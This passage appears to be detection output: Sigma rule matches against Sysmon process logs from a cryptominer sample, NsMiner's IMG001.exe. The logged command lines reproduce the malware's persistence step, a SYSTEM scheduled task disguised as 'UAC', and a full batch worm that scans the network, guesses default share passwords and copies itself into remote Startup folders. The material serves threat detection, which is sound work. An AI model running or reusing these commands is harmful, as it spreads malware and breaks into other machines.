                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-6206-000000003B00}; ProcessId=7924; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C088-6560-5A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7804; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08F-6560-9606-000000003B00}; ProcessId=1880; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08E-6560-8F06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4080; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839567; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "3bc9d14114a6b67367a24df21134d0564d6f08a0ad903d68f9b25e9d8b7f0790",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Scheduled Task Creation",
                                                                       "rule_description":  "Detects the creation of scheduled tasks in user session",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07B-6560-2F06-000000003B00}; ProcessId=3540; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07B-6560-2906-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2172; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839547; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07B-6560-3106-000000003B00}; ProcessId=6736; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07B-6560-2B06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7292; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839547; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-6006-000000003B00}; ProcessId=8040; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C088-6560-5806-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7856; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-6206-000000003B00}; ProcessId=7924; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C088-6560-5A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7804; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08F-6560-9606-000000003B00}; ProcessId=1880; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08E-6560-8F06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4080; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839567; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "3bc9d14114a6b67367a24df21134d0564d6f08a0ad903d68f9b25e9d8b7f0790",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Scheduled Task Creation Via Schtasks.EXE",
                                                                       "rule_description":  "Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=schtasks.exe; Hashes=MD5=478BEAEC1C3A9417272BC8964ADD1CEE,SHA256=9A121ACF7686D2883E524332111D5E4BCC0C1A8E81136486FBA4CA65CA614407,IMPHASH=918DBB01101BFA7F1042CCA9520D2A05; Description=Task Scheduler Configuration Tool; FileVersion=10.0.19041.906 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; CommandLine=schtasks  /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\schtasks.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "76a1e5bc5c7d4b95d8c382b4ecefb6a628ea4fba6cbf029fbb3cc32d36dcce57",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Network Command",
                                                                       "rule_description":  "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems",
                                                                       "rule_author":  "frack113, Christopher Peacock \u0027@securepeacock\u0027, SCYTHE \u0027@scythe_io\u0027",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07E-6560-3706-000000003B00}; ProcessId=7868; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839550; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07E-6560-3906-000000003B00}; ProcessId=7816; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07E-6560-3706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7868; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=C:\\Windows\\system32\\cmd.exe /c @net view|find /i \"\\\\\" || @arp -a|find /i \"  1\"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839550; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C083-6560-4506-000000003B00}; ProcessId=8124; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839555; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C083-6560-4706-000000003B00}; ProcessId=8064; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C083-6560-4506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8124; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=C:\\Windows\\system32\\cmd.exe /c @net view|find /i \"\\\\\" || @arp -a|find /i \"  1\"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start 